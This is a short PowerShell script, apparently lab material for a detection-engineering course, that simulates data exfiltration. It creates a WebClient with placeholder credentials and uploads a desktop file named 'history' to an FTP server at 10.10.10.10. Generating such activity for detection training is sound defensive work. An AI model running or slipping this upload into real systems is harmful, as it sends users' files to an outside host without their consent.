#Created for TCM Academy Detection Engineering 101 course
#transfer file called history to ftp server
$client = New-Object System.Net.WebClient
$client.Credentials = New-Object System.Net.NetworkCredential("insertuser", "insertpass")
$client.UploadFile("ftp://10.10.10.10/history","C:\Users\User\Desktop\history")
